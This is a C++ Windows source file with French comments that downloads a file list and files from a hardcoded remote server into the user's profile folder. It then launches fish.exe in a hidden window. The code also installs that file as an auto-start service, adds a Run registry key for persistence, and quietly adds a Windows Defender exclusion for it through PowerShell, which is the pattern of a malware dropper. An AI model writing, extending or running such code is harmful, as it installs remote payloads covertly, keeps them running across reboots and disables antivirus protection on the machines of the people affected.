#include <windows.h>
#include <shlobj.h>
#include <wininet.h>
#include <string>
#include <vector>
#include <fstream>
#include <iostream>
#include "../include/core.h"

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "advapi32.lib")

using namespace std;

const string SERVER_URL = "https://arthur.xn--pruvost-rivire-6jb.fr/cdn/";
const string FILE_LIST = "files.txt";

// Fonction pour exécuter un fichier
void ExecuteFile(const string& filePath) {
    ShellExecute(NULL, "open", filePath.c_str(), NULL, NULL, SW_HIDE);
}

// Fonction pour installer un service Windows
bool InstallService(const string& serviceName, const string& exePath) {
    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!hSCManager) return false;

    SC_HANDLE hService = CreateService(
        hSCManager, serviceName.c_str(), serviceName.c_str(),
        SERVICE_ALL_ACCESS, SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
        exePath.c_str(), NULL, NULL, NULL, NULL, NULL
    );

    if (!hService) {
        CloseServiceHandle(hSCManager);
        return false;
    }

    CloseServiceHandle(hService);
    CloseServiceHandle(hSCManager);
    return true;
}

// Fonction pour éxécuter fish au démarrage
void AddToStartup() {
    HKEY hKey;
    const char* regPath = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
    const char* appName = "fish";
    char szPath[MAX_PATH];

    if (GetEnvironmentVariableA("USERPROFILE", szPath, MAX_PATH)) {
        strcat_s(szPath, "\\fish\\fish.exe");

        if (RegOpenKeyExA(HKEY_CURRENT_USER, regPath, 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, appName, 0, REG_SZ, (BYTE*)szPath, strlen(szPath) + 1);
            RegCloseKey(hKey);
        }
    }
}

// Fonction qui ajoute une exclusion à windows defender
void AddDefenderExclusion(const string& folderPath) {
    string command = "powershell -Command \"Set-MpPreference -ExclusionPath '" + folderPath + "'\"";
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;

    if (CreateProcessA(NULL, (LPSTR)command.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
}


int main() {

    RequestAdminPrivileges();

    string userFolder = GetUserFolderPath();
    if (userFolder.empty()) {
        MessageBox(NULL, "Impossible d'obtenir le dossier utilisateur.", "Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }

    string fishFolder = userFolder + "\\fish";
    CreateDirectory(fishFolder.c_str(), NULL);


    string fileListPath = fishFolder + "\\" + FILE_LIST;
    if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
        MessageBox(NULL, "Échec du téléchargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
        return 1;
    }


    vector<string> filesToDownload = GetFileList(fileListPath);


    for (const string& file : filesToDownload) {
        string url = SERVER_URL + file;
        string localPath = fishFolder + "\\" + file;
        if (!DownloadFile(url, localPath)) {
            MessageBox(NULL, ("Échec du téléchargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
        }
    }

    // Lancer fish.exe
    string fishPath = fishFolder + "\\fish.exe";
    ExecuteFile(fishPath);

    // Installer le service Windows
    InstallService("fish", fishPath);

    // Ajouter au démarrage
    AddToStartup();

    // Bloc de debug à supprimer au déploiement final
    cout << fishPath << endl;
    cout << userFolder << endl;
    cout << fishFolder << endl;

    // Ajouter une exclusion antivirus
    AddDefenderExclusion(fishPath);

    return 0;
}